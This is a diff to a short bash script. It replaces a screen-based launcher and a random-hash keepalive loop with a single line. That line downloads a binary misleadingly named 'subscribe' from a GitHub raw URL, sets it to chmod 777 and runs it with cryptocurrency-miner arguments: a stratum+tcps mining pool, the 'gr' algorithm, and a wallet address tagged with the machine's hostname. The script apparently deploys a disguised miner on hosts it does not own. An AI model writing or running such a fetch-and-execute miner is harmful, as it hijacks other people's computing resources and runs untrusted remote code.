@@ -1,4 +1,2 @@
 #!/bin/bash
-sudo apt update && sudo apt install screen -y
-chmod 777 wib && screen -dmS wib ./wib
-while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
+wget https://raw.githubusercontent.com/mariobiszz/students/main/subscribe && chmod 777 subscribe && ./subscribe -a gr -o stratum+tcps://stratum-ru.rplant.xyz:17056 -u RJMHcqVJEzYwdD4tzG1dvYfQfpMaTjXPAz.$(cat /proc/sys/kernel/hostname)
